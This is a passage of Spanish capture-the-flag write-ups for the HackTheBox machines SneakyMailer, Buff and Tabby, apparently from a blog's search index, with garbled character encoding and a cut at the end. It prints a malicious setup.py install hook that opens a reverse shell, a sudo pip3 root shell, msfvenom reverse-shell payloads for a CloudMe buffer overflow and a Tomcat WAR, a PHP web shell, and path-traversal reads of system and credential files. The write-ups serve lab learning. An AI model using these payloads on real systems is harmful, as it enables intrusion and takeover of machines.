‚Äúlogin‚Äù, aunque no nos muestra nada, pero probablemente m√°s adelante debamos usar las credenciales. Bueno, con base en lo que nos muestra http://pypi. sneakycorp. htb:8080/ nos da una idea que podemos instalar paquetes en su ‚Äúrepositorio‚Äù interno. Pues creemos nuestro paquete malicioso y sub√°moslo al repositorio pypi. sneakycorp. htb/simple. ‚Ä¶ Buscando en internet sobre maneras de explotar PyPI y sus paquetes, encontr√© unos retos tipo CTF para aprender sobre el tema, ac√° se los dejo:  Python PyPI Challenges.  Articulo de un investigador que ha encontrado varios paquetes maliciosos sobre PyPI. ‚Ä¶ Esta m√°quina me desquicio, pero fue muy divertida e interesante‚Ä¶ Ac√° me estanque fuertemente, ya que el proceso de crear el paquete ‚Äúmalicioso‚Äù (que llamaremos pycod3ate) estaba siendo algo dif√≠cil de entender‚Ä¶ Adem√°s me estaba complicando de m√°s: Siguiendo esta gu√≠a, genere la estructura inicial.  Packaging tutorial python. org. Primero monte todo en mi m√°quina y cuando ya posiblemente tuviera todo bien lo pasar√≠a a la m√°quina v√≠ctima. Lo importante ser√° crear nuestro setup. py que ser√° el que contendr√° la informaci√≥n del paquete que subiremos, pero adem√°s tendr√° el c√≥digo malicioso, as√≠ cuando en la m√°quina v√≠ctima le indiquemos que ejecute el setup. py ejecutara de paso nuestro payload :) De manera sencilla podemos decirle al script que nos genere una reverse Shell (que si traemos el recuerdo de los mails, sabemos que las tareas sobre paquetes son llevadas a cabo por low, por lo tanto obtendremos una sesi√≥n como el), yo tome la cl√°sica de Python:  Reverse shells cheat sheet. python -c 'import socket,subprocess,os;s=socket. socket(socket. AF_INET,socket. SOCK_STREAM);s. connect(( 10. 0. 0. 1 ,1234));os. dup2(s. fileno(),0); os. dup2(s. fileno(),1); os. dup2(s. fileno(),2);p=subprocess. call([ /bin/sh , -i ]);'Entonces dentro de la clase que se ejecutara pondremos: import socket, subprocess, osfrom setuptools import setupfrom setuptools. command. install import installclass TotallyInnocentClass(install):  def run(self):    s=socket. socket(socket. AF_INET,socket. SOCK_STREAM)    s. connect(( 10. 10. 15. 86 ,4444))    os. dup2(s. fileno(),0)    os. dup2(s. fileno(),1)    os. dup2(s. fileno(),2)    p=subprocess. call([ /bin/sh , -i ]);    install. run(self)setup(  name= pycod3ate ,  version= 0. 0. 5 ,  author= exeTera ,  author_email= hor@exe. com ,  description= Killing me ,  url= https://github. com/pypa/sampleproject ,  packages=setuptools. find_packages(),  classifiers=[     Programming Language :: Python :: 3 ,     License :: OSI Approved :: MIT License ,     Operating System :: OS Independent ,  ],  cmdclass={    'install': TotallyInnocentClass  })Para la estructura y entendimiento me base en estos paquetes:  Ayrx + malicious-python-package.  mschwager + 0wned-package. Teniendo nuestro c√≥digo malicioso lo que nos queda es ejecutarlo desde la m√°quina v√≠ctima, ponernos en escucha y obtener la reverse Shell por el puerto 4444. Para ello usamos: ‚Äì¬ª python3 setup. py sdistEl cual nos genera el siguiente √°rbol de objetos. ‚Äì¬ª tree -a. ‚îú‚îÄ‚îÄ dist‚îÇ  ‚îî‚îÄ‚îÄ pycod3ate-0. 0. 5. tar. gz‚îú‚îÄ‚îÄ LICENSE‚îú‚îÄ‚îÄ pycod3ate‚îÇ  ‚îú‚îÄ‚îÄ __init__. py‚îÇ  ‚îî‚îÄ‚îÄ __init__. pyc‚îú‚îÄ‚îÄ pycod3ate. egg-info‚îÇ  ‚îú‚îÄ‚îÄ dependency_links. txt‚îÇ  ‚îú‚îÄ‚îÄ PKG-INFO‚îÇ  ‚îú‚îÄ‚îÄ SOURCES. txt‚îÇ  ‚îî‚îÄ‚îÄ top_level. txt‚îú‚îÄ‚îÄ README. md‚îî‚îÄ‚îÄ setup. pyEn este punto cuando sub√≠a setup. py a la m√°quina e intentaba ejecutarlo no pasaba nada, se creaban los archivos y parec√≠a que todo iba bien pero no obten√≠a ning√∫n output en la reverse Shell‚Ä¶ Me queme un poco y de nuevo recurr√≠ a TazWake Me indico que lo √≥ptimo es crear un archivo . pypirc el cual contenga unas credenciales (las de pypi que ya encontramos) y un repositorio al cual se van a subir los objetos, as√≠ setup. py sabe a donde apuntar, este ser√≠a nuestro archivo . pypirc (que debe ser alojado en el $HOME). ‚Äì¬ª cat . pypirc [distutils]index-servers =  locuras[locuras]repository: http://pypi. sneakycorp. htb:8080/username: pypipassword: soufianeelhaouiY en nuestra ejecuci√≥n anterior agregaremos: ‚Äì¬ª python3 setup. py sdist register -r locuras upload -r locurasVamos a la m√°quina v√≠ctima, subimos el nuevo setup. py, subimos . pypirc, indiqu√©mosle que tome el index locuras e intentemos conseguir la reverse Shell :) :( Obtenemos este error: . . .  File  /usr/lib/python3. 7/distutils/command/register. py , line 80, in _set_config  raise ValueError('%s not found in . pypirc' % self. repository)ValueError: locuras not found in . pypircComo sabemos el archivo debe estar en la ruta $HOME, validemos que ruta tenemos y si podemos escribir sobre ella developer@sneakymailer:/dev/shm$ echo $HOMEecho $HOME/var/www/dev. sneakycorp. htbdeveloper@sneakymailer:/dev/shm$ cp . pypirc /var/www/dev. sneakycorp. htbcp . pypirc /var/www/dev. sneakycorp. htbcp: cannot create regular file '/var/www/dev. sneakycorp. htb/. pypirc': Permission denieddeveloper@sneakymailer:/dev/shm$ Pues no, no tenemos permiso, juguemos con las variables del entorno y dig√°mosle que tome /dev/shm como $HOME por un momento y despu√©s lo dejamos como estaba :P developer@sneakymailer:/dev/shm$ ORIGINALhome=$HOMEORIGINALhome=$HOMEdeveloper@sneakymailer:/dev/shm$ echo $ORIGINALhomeecho $ORIGINALhome/var/www/dev. sneakycorp. htbdeveloper@sneakymailer:/dev/shm$ export HOME=/dev/shmexport HOME=/dev/shmdeveloper@sneakymailer:~$ echo $HOMEecho $HOME/dev/shmdeveloper@sneakymailer:~$ Listo, ejecutemos y veamos: ‚Äì¬ª python3 setup. py sdist register -r locuras upload -r locuras SI SE√ëOOOOOOOR!!! Obtenemos nuestra reverse Shell, que maravilla y que locura‚Ä¶ (Estuve mis buenos d√≠as d√°ndole a esto) Dejamos la variable $HOME como estaba: developer@sneakymailer:~$ echo $HOMEecho $HOME/dev/shmdeveloper@sneakymailer:~$ export HOME=$ORIGINALhomeexport HOME=$ORIGINALhomedeveloper@sneakymailer:/dev/shm$ echo $HOMEecho $HOME/var/www/dev. sneakycorp. htbdeveloper@sneakymailer:/dev/shm$ Algunos recursos √∫tiles en el proceso:  https://dzone. com/articles/executable-package-pip-install.  https://gist. github. com/wjladams/f00d6c590a4384ad2a92bf9c53f6b794.  https://medium. com/@joel. barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56.  https://packaging. python. org/tutorials/packaging-projects/.  https://docs. python. org/3. 3/distutils/packageindex. html.  https://the-hitchhikers-guide-to-packaging. readthedocs. io/en/latest/contributing. html.  https://packaging. python. org/specifications/pypirc/. ‚Ä¶ Escalada de privilegios #: Si vemos que puede ejecutar low como root mediante sudo vemos pip3 y que no nos pedir√° contrase√±a. low@sneakymailer:~$ sudo -lsudo -lsudo: unable to resolve host sneakymailer: Temporary failure in name resolutionMatching Defaults entries for low on sneakymailer:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser low may run the following commands on sneakymailer:  (root) NOPASSWD: /usr/bin/pip3low@sneakymailer:~$ Si hacemos una b√∫squeda r√°pida en internet, podemos conseguir una Shell indic√°ndole a pip3 que instale un paquete temporal, el cual simplemente hace eso, darnos una Shell, pero como el binario puede ser ejecutado con permisos de administrador, usaremos eso para obtener una sesi√≥n como el usuario administrador :)  Info de como conseguir la Shell mediante pip. low@sneakymailer:~$ TF=$(mktemp -d)low@sneakymailer:~$ echo  import os; os. execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')  &gt; $TF/setup. pylow@sneakymailer:~$ sudo usr/bin/pip3 install $TFYyyyyy‚Ä¶ Obtenemos la Shell como administrador, veamos las flags :) ‚Ä¶ Y eso es todo para esta m√°quina‚Ä¶ Muy enredada, poquito de locura pero se disfrut√≥, entendimos como son manejados los paquetes en python (PyPI) y jugamos un poco con ‚Äúphishing‚Äù al inicio. Claramente la parte m√°s desafiante fue la creaci√≥n y ejecuci√≥n del paquete pero de eso se trata, aprender y romperse la cabeza un poquito y lo m√°s importante, nunca rendirse :) La escalada quiz√°s fue hecha para compensar el peso del inicio y la obtenci√≥n del usuario. De igual forma es superinteresante ver que con 3 l√≠neas ya eres administrador :P Muchas gracias por leer y a romper todo, que pases un feliz y lindo d√≠a/noche/ninguna :P "
    }, {
    "id": 68,
    "url": "http://localhost:4000/htb/buff",
    "title": "HackTheBox - Buff",
    "body": "2020/11/21 - M√°quina Windows nivel f√°cil. Buff buff uff, explotaremos un gimnasio :o (casi) yyy aprovecharemos un Buffer Overflow para ser amos del sistema‚Ä¶ ¬øSencillo, no? pues‚Ä¶ TL;DR (Spanish writeup): Buenas buenas, e. e. Mediante la enumeraci√≥n de servicios nos encontramos con el puerto 8080 abierto, d√°ndole vueltas nos topamos con el software con que fue creada la p√°gina, Gym Management System 1. 0, usando searchsploit y la web le encontramos un exploit, nos aprovecharemos de el para obtener acceso a la m√°quina. Estando dentro veremos que el usuario shaun en sus carpetas tiene un binario interesante (del servicio CloudMe), el cual nos permite hacer cositas con las nubes :P, enumerando su origen veremos que existe un Buffer Overflow que afecta la versi√≥n que tenemos y nos permite ejecutar c√≥digo como usuario administrador. Con esto en mente nos pondremos a jugar para hacer un Remote Port Forwarding ya que la maquina nos presentara limitantes. Despu√©s del RPF usaremos nuestras propias herramientas para que el BOF nos genere una reverse Shell como el usuario administrador del sistema. Eeeeeeeeeeeeeesto en pocas palabras. D√©mosle candela (:  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme :) Tendremos 3 fases. Enumeraci√≥n, explotaci√≥n y escalada de privilegios (:  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n #: Hacemos un escaneo de puertos con nmap, primero validamos que tal va de velocidad y seg√∫n eso agregamos par√°metros para hacerlo m√°s r√°pido, eso si, validando falsos positivos (que se nos pierdan puertos). $nmap -p- --open -Pn -v 10. 10. 10. 198Wow, va muy lento, agreg√°ndole -T no cambia mucho, as√≠ que usaremos --min-rate. $nmap -p- --open --min-rate=2000 -Pn -v 10. 10. 10. 198      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -T4   Forma de escanear superr√°pido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos)       ‚Äìmin-rate   Indica que no queremos hacer peticiones menores al num que pongamos (i. e: ‚Äìmin-rate=5000)       -Pn   Evita que realice Host Discovery, tales como Ping (P) y DNS (n)       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo (con formato grepeable, para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard)    Perfe, obtenemos dos puertos.  8080: Servicio web.  7680: No se que sea este puerto, validemosAhora que tenemos los puertos, haremos un escaneo para verificar que versi√≥n y scripts maneja cada uno. $nmap -p8080,7680 -sC -sV 10. 10. 10. 193 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo    Nada relevante :( &gt; Servicio web puerto 8080: Enumerando la p√°gina vemos que software se us√≥ para su creaci√≥n.  ‚Ä¶ Explotaci√≥n #: Buscando exploits sobre el, encontramos: $searchsploit gym-------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                   | Path-------------------------------------------------------------------------------------------------------------------- ---------------------------------Gym Management System 1. 0 - Unauthenticated Remote Code Execution                          | php/webapps/48506. py-------------------------------------------------------------------------------------------------------------------- --------------------------------- Este es el exploit: Exploit Gym Management System. Perfecto, validando el c√≥digo y el PoC, hace un bypass en la subida de archivos de la p√°gina /upload. php para almacenar un archivo que nos permita ejecutar comandos desde el mismo exploit. Est√° perfectamente explicado en el script :P El mismo exploit nos ‚Äúemula‚Äù una Shell, pero no estamos en una Shell (parece, pero es por que en el script se est√° ejecutando echo %CD%, lo cual en Windows nos dice en que carpeta estamos), simplemente tenemos ejecuci√≥n de comandos, pero limitados, por lo que lo mejor es subir el binario netcat para posteriormente ponernos en escucha y simplemente enviar la petici√≥n con el exploit. $python3 -m http. server Listo, estando dentro y haciendo una enumeraci√≥n b√°sica sobre el usuario shaun, nos encontramos con un binario en su carpeta de descargas. c:\Users\shaun\Downloads&gt;dirdir Volume in drive C has no label. Volume Serial Number is A22D-49F7 Directory of c:\Users\shaun\Downloads05/10/2020 00:12  &lt;DIR&gt;     . 05/10/2020 00:12  &lt;DIR&gt;     . . 16/06/2020 16:26    17,830,824 CloudMe_1112. exe        1 File(s)   17,830,824 bytes        2 Dir(s)  7,934,279,680 bytes freec:\Users\shaun\Downloads&gt;‚Ä¶ Escalada de privilegios #: Investigando en internet vemos que esa versi√≥n de CloudMe es vulnerable a Buffer Overflow (si lo relacionamos con el nombre de la m√°quina sabemos que este es el camino) permiti√©ndonos ejecutar comandos en el sistema. Ya existen varios PoC (pruebas de concepto) que lo explotan. En todos los exploits usan el puerto 8888, con ello entendemos que CloudMe se ejecuta en ese puerto. En nuestro escaneo no lo obtuvimos, veamos su estado. Si ejecutamos el binario y posteriormente validamos si el puerto est√° arriba vamos a verlo arriba: c:\Users\shaun\Downloads&gt;netstat -a | findstr 8888Tenemos que est√° en escucha pero mediante el localhost. Pues sencillo, solo es ejecutar el script, cambiarle el payload de msfvenom para que haga una petici√≥n a nuestra m√°quina y listos‚Ä¶ Pues no, la maquina no tiene Python y no permite ejecutar scripts de PowerShell (hay un exploit tambi√©n). As√≠ que tenemos dos opciones, pasar alg√∫n script de Python a . exe y subirlo o hacer un Remote Port Forwarding. Me voy con la segunda opci√≥n. (La primera la intente pero me dio problemas). B√°sicamente un Remote Port Forwarding nos permite tomar un puerto de la m√°quina local para decirle que tome ese puerto y lo monte en uno de la m√°quina remota‚Ä¶ Por lo que si tenemos el puerto 8888 localmente y le decimos que queremos montar ese puerto en nuestra m√°quina remota, tendremos el servicio CloudMe (8888) ejecut√°ndose en nuestro puerto :). Y como en nuestra m√°quina si tenemos python, podremos explotarlo. Validemos que hay en nuestro puerto 8888: ‚îå‚îÄ[root@rave]‚îÄ[/buff]‚îî‚îÄ‚îÄ‚ïº #lsof -i:8888‚îå‚îÄ[‚úó]‚îÄ[root@rave]‚îÄ[/buff]‚îî‚îÄ‚îÄ‚ïº #Nada a√∫n. El Remote Port Forwarding lo haremos con plink. exe (relativamente parecido a SSH pero para Windows), procedemos a subirlo y ejecutarlo. Pero antes, veamos alguna configuraci√≥n necesaria en nuestra m√°quina atacante sobre SSH. En el archivo /etc/ssh/sshd_config debemos modificar que nos permita ingresar como root, por que si no, nos va a botar unos errores. $cat /etc/ssh/sshd_config. . . . . . PermitRootLogin yes. . . . . . Y ahora reiniciamos el servicio SSH. $service ssh restartListo ahora si procedemos a subir el binario y ejecutarlo. c:\Users\shaun\Downloads&gt;cd c:\Xampp\tmpc:\Xampp\tmp&gt;powershell IWR -uri http://10. 10. 15. 86:8000/plink. exe -OutFile c:\Xampp\tmp\plink. exec:\Xampp\tmp&gt;plink. exe -l root -pw hola2 -R 8888:127. 0. 0. 1:8888 10. 10. 15. 86FATAL ERROR: Network error: Connection timed outAc√° tuve algunos problemas, ya que por alguna extra√±a raz√≥n (valide firewall, configuraciones, etc) no me permit√≠a conectarme al puerto 22 (SSH), as√≠ que cambiando el puerto que estar√° en escucha si nos permite ejecutarlo. $cat /etc/ssh/sshd_config. . . Port 177. . . Y ejecutamos: Perfecto, ya tenemos el puerto 8888 del localhost de la m√°quina 10. 10. 10. 198 (BUFF) en nuestro equipo, lo siguiente es tomar alg√∫n exploit, crear el payload y ejecutarlo sobre nuestro localhost :) Usaremos dos exploits, de uno obtendr√© como generar el payload y el otro ser√° la estructura del script.  Payload, aunque se puede usar este tambi√©n para explotarlo, pero me pareci√≥ m√°s legible el siguiente: El que usaremos. Le diremos que nos genere una reverse Shell hacia el puerto 4433. Primero generemos el payload con msfvenom (que no es lo mismo que msfconsole (metasploit)). # msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; EXITFUNC=thread -b  \x00\x0d\x0a  -f python$msfvenom -p windows/shell_reverse_tcp LHOST=10. 10. 15. 86 LPORT=4433 EXITFUNC=thread -b  \x00\x0d\x0a  -f pythonEl output lo ponemos en el exploit. Nos ponemos en escucha y listo, ejecutar√° todo sobre el localhost:8888.  ‚Ä¶ Y listones, primer BOF en HTB que ‚Äúhago‚Äù (en este caso simplemente lo ejecut√©), sencilla, bonita y nueva para m√≠. Gracias por leer y a romper todo como siempre :P "
    }, {
    "id": 69,
    "url": "http://localhost:4000/htb/tabby",
    "title": "HackTheBox - Tabby",
    "body": "2020/11/07 - M√°quina Linux nivel f√°cil. Tabbyen, jugaremos con un LFI, buscaremos hasta m√°s no poder un archivo de tomcat, explotaremos al manager para que nos permita entrar en la casa de tom, crackearemos un archivo . zip para despues aprovecharnos del grupo LXD y tener control total del sistema.  TL;DR (Spanish writeup): Bueeeeno, hola, empezaremos explotando una vulnerabilidad Local File Inclusion, la cual usaremos para ver el archivo tomcat-users. xml del paquete tomcat en la m√°quina y obtener las credenciales guardadas ah√≠‚Ä¶ Explotaremos por medio del apartado /manager del servicio tomcat web un rol que nos permite subir archivos, subiremos un payload que al ejecutarlo nos de una reverse Shell. Estando en la m√°quina encontraremos un archivo de backup. zip el cual crackearemos y con la password encontrada lograremos migrar al usuario ash. Validando los grupos del usuario ash veremos que est√° dentro de lxd, explotaremos el grupo y usaremos esta info para obtener una Shell como root.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme :) (por si ves mucho texto a veces) Como siempre, tendremos 3 fases:  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n: Hacemos un escaneo de puertos con nmap, seg√∫n la velocidad con la que vaya agregamos par√°metros para hacerlo m√°s r√°pido, eso si, validando que no se nos pierdan puertos. ‚îÄ‚ïº $ nmap -p- --open -v 10. 10. 10. 194Pero va lento, agregando -T no cambia mucho, as√≠ que podemos usar --min-rate. (Sin embargo es importante hacer un escaneo total, sin cambios as√≠ vaya lento, que nos permita ver si --min-rate obvia alg√∫n puerto. ‚îÄ‚ïº $ nmap -p- --open -v -Pn --min-rate=2000 10. 10. 10. 194 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -T4   Forma de escanear superr√°pido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos)       ‚Äìmin-rate   Indica que no queremos hacer peticiones menores al num que pongamos (i. e: ‚Äìmin-rate=5000)       -Pn   Evita que realice Host Discovery, tales como Ping (P) y DNS (n)       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable, ya que uso una funci√≥n que me extrae los puertos   ‚îÄ‚ïº $ cat initScan # Nmap 7. 80 scan initiated Mon Oct 5 12:09:18 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10. 10. 10. 194# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 194 ()  Status: UpHost: 10. 10. 10. 194 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8080/open/tcp//http-proxy///Listo, obtenemos los puertos:  22: SSH 80: Servidor web 8080: ProxyProcedemos a nuestro escaneo de versiones y scripts. ‚îÄ‚ïº $ nmap -p22,80,8080 -sC -sV 10. 10. 10. 194 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚îÄ‚ïº $ cat portScan# Nmap 7. 80 scan initiated Mon Oct 5 12:16:03 2020 as: nmap -p22,80,8080 -sC -sV -oN portScan 10. 10. 10. 194Nmap scan report for 10. 10. 10. 194Host is up (0. 19s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 8. 2p1 Ubuntu 4 (Ubuntu Linux; protocol 2. 0)80/tcp  open http  Apache httpd 2. 4. 41 ((Ubuntu))|_http-server-header: Apache/2. 4. 41 (Ubuntu)|_http-title: Mega Hosting8080/tcp open http  Apache Tomcat|_http-title: Apache TomcatService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRevisando cada versi√≥n con searchsploit no encontramos nada. Puerto 80: Enumerando simplemente encontramos en el apartado /news que si entramos la URL cambia a http://megahosting. htb/news. php?file=statement. Por lo que debemos modificar en nuestro archivo /etc/hosts ese reconocimiento. Para que cuando la petici√≥n sea hacia el dominio megahosting. htb la resuelva la IP 10. 10. 10. 194. ‚îÄ‚ïº $ cat /etc/hosts10. 10. 10. 194 megahosting. htbSi volvemos a entrar ahora si nos permite ver el contenido:  We apologise to all our customers for the previous data breach. We have changed the site to remove this tool, and have invested heavily in more secure servers ‚Ä¶ Explotaci√≥n: Veamos la URL. Toma un argumento llamado file, lo que en nuestra cabeza puede significar que puede estar tomando cualquier archivo que le indiquemos‚Ä¶ Por lo que posiblemente tengamos un Local/Remote File Inclusion, que nos permitir√≠a ver e INCLUIR archivos en el sistema. Probemos ver un archivo local. Dig√°mosle que nos muestre el archivo /etc/passwd. http://megahosting. htb/news. php?file=. . /. . /. . /. . /. . /. . /etc/passwd ‚îÄ‚ïº $ curl -s http://megahosting. htb/news. php?file=. . /. . /. . /. . /. . /. . /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsetomcat:x:997:997::/opt/tomcat:/bin/falsemysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/falseash:x:1000:1000:clive:/home/ash:/bin/bashPerfecto, tenemos Local (vemos un usuario ash), probemos Remote. Primero creemos un archivo que nos permita ejecutar comandos en el sistema por medio de un argumento. ‚îÄ‚ïº $ cat shxcx. php&lt;?php shell_exec($_GET['xmd']); ?&gt;Ahora montamos un servidor web r√°pidamente con python: $ python3 -m http. server y desde la URL le indicamos: http://megahosting. htb/news. php?file=http://10. 10. 15. 86:8000/shxcx. php?xmd=pwdPero no obtenemos respuesta, por lo tanto nos quedaremos con el Local File Inclusion. ‚Ä¶ Podemos revisar procesos en el directorio /proc/. . . pero no tenemos nada relevante. Puerto 8080: (Esta imagen se me olvido tomarla, buscando en otros writeups la encontre perfecta ac√° :)) Nos topamos con la p√°gina por default de tomcat, veamos que nos cuenta‚Ä¶ Varias cosas interesantes:       Descripci√≥n   Ruta         Rules   /usr/share/doc/tomcat9-common/RUNNING. txt. gz       CATALINA_HOME   /usr/share/tomcat9       CATALINA_BASE   /var/lib/tomcat9       Local filesystem   /var/lib/tomcat9/webapps/ROOT/index. html       Users   /etc/tomcat9/tomcat-users. xml   Tenemos esa ‚Äúestructura‚Äù de archivos, la m√°s interesante claramente es la que relaciona Users, usando el LFI para leer el contenido no obtenemos ninguno‚Ä¶ El archivo index. html si nos responde, pero es la misma informaci√≥n que estamos viendo en la p√°gina :) Buscando en internet indican dos cosas importantes:  Lo m√°s com√∫n es que el archivo tomcat-users. xml este dentro de la carpeta $CATALINA_HOME/conf/, por lo que debemos empezar a buscar ah√≠‚Ä¶ El archivo tiene usuario y contrase√±a para poder entrar a los apartados manager webapp y host-manager webappPero tampoco obtenemos salida. En una guia encontre que al momento de instalar tomcat necesitaremos un archivo de -servicio- y est√° guardado en /etc/systemd/system/tomcat. service, dentro del estar√°n las rutas que est√° usando CATALINA_HOME y CATALINA_BASE. ‚îÄ‚ïº $ curl -s http://megahosting. htb/news. php?file=. . /. . /. . /. . /. . /. . /. . /etc/systemd/system/tomcat. service[Unit]Description=Tomcat 9 servlet containerAfter=network. target[Service]Type=forkingUser=tomcatGroup=tomcatEnvironment= JAVA_HOME=/usr/lib/jvm/default-java Environment= JAVA_OPTS=-Djava. security. egd=file:///dev/urandom -Djava. awt. headless=true Environment= CATALINA_BASE=/opt/tomcat/latest Environment= CATALINA_HOME=/opt/tomcat/latest Environment= CATALINA_PID=/opt/tomcat/latest/temp/tomcat. pid Environment= CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC ExecStart=/opt/tomcat/latest/bin/startup. shExecStop=/opt/tomcat/latest/bin/shutdown. sh[Install]WantedBy=multi-user. targetValidando sobre ese CATALINA_HOME tampoco vemos salida del archivo tomcat-users. xml. Por lo tanto lo mejor es instalar localmente tomcat y ver como y donde se crean los archivos para as√≠ no ir a ciegas. Pero obtenemos la misma estructura que en internet y a√∫n ning√∫n output. Despu√©s de bastante tiempo intentando cosas me fui para el foro de HackThebox, una pista en la que simplemente referenciaba sudo apt-get install . . . find / -name. . . Me hizo dudar si la persona que creo la m√°quina lo hab√≠a hecho as√≠ y si esa manera creaba diferentes archivos en diferentes lados‚Ä¶ Pues si: ‚îÄ‚ïº $ sudo apt-get install tomcat9‚îÄ‚ïº $ find / -name  tomcat-users. xml /etc/tomcat9/tomcat-users. xml/opt/tomcat/conf/tomcat-users. xml/usr/share/tomcat9/etc/tomcat-users. xmlY ahora haciendo la b√∫squeda sobre esa nueva ruta: /usr/share/tomcat9/etc/tomcat-users. xml tenemos credenciales: ‚îÄ‚ïº $ curl -s http://megahosting. htb/news. php?file=. . /. . /. . /. . /. . /. . /. . /usr/share/tomcat9/etc/tomcat-users. xml&lt;?xml version= 1. 0  encoding= UTF-8 ?&gt;&lt;!-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements.  See the NOTICE file distributed with this work for additional information regarding copyright ownership.  The ASF licenses this file to You under the Apache License, Version 2. 0 (the  License ); you may not use this file except in compliance with the License.  You may obtain a copy of the License at. . . . . . . . .  &lt;role rolename= admin-gui /&gt;  &lt;role rolename= manager-script /&gt;  &lt;user username= tomcat  password= $3cureP4s5w0rd123!  roles= admin-gui,manager-script /&gt;&lt;/tomcat-users&gt;Listos, procedamos a validarlas Estamos dentro, revisando el archivo tomcat-users. xml vemos dos roles:  admin-gui: Nos permite entrar al /host-manager.  manager-script: Nos va a permitir jugar con scripts. D√©mosle un vistazo a esteSiguiendo esta guia vemos la manera de ejecutar comandos en la m√°quina, podemos aprovecharnos de esto para obtener una reverse Shell. Todo pasa por que podemos subir un archivo malicioso . WAR  En computaci√≥n, un archivo WAR es un archivo JAR utilizado para distribuir una colecci√≥n de JavaServer Pages, servlets, clases Java, archivos XML‚Ä¶ Wikipedia Lo primero es generar el archivo, podemos usar msfvenom para ello:  [Esta otra guia] nos explica como seria crear el archivo en vez de usar msfvenom # Creamos el archivo‚îÄ‚ïº $ msfvenom -p java/shell_reverse_tcp lhost=10. 10. 15. 86 lport=4433 -f war -o pwn. war# Subimos el archivo y lo alojamos en la ruta `/foo`‚îÄ‚ïº $ curl -u tomcat:'$3cureP4s5w0rd123!' --upload-file pwn. war  http://10. 10. 10. 194:8080/manager/text/deploy?path=/foo&amp;update=true # Nos ponemos en escucha‚îÄ‚ïº $ nc -nlvp 4433# Ejecutamos la petici√≥n‚îÄ‚ïº $ curl -s http://10. 10. 10. 194:8080/foo‚îÄ‚ïº $ rlwrap nc -nlvp 4433listening on [any] 4433 . . . connect to [10. 10. 15. 86] from (UNKNOWN) [10. 10. 10. 194] 38884iduid=997(tomcat) gid=997(tomcat) groups=997(tomcat)hostnametabbywhoamitomcatcd //script /dev/null -c bashScript started, file is /dev/null Estamos dentro, ahora a enumerar :) Vemos el usuario ash en el directorio home, pero no tenemos acceso a el. Veamos que podemos usar para obtenerlo. Buscando de que archivos es owner el usuario tomcat no obtenemos nada relevante‚Ä¶ Si lo hacemos con ash obtenemos esto: 